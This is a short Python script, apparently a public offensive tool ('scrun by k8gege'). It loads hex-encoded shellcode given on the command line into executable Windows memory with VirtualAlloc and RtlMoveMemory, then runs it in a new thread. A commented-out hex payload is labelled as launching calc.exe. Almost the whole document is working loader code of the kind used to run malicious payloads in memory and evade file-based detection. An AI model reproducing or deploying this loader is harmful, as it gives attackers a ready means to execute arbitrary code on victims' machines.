#scrun by k8gege
import ctypes
import sys
#calc.exe
#sc = "DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"
shellcode=bytearray(sys.argv[1].decode("hex"))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
 
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
 
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))


